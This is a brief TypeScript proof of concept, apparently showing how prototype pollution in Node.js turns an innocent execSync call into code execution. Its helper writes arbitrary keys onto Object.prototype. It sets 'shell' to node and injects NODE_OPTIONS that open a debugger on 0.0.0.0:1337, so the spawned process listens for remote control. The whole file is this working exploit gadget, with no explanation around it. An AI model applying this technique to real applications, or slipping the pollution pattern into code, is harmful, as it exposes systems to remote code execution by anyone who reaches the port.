import { execSync } from "node:child_process";

function pollute(key: string, value: any) {
    ((((Object as any).prototype as any)[key]) as any) = value;
}

pollute("shell", "node");
pollute("env", { NODE_OPTIONS: "--inspect-brk=0.0.0.0:1337" });

const process = execSync("echo 'Hello world!'");
console.log(process.toString());
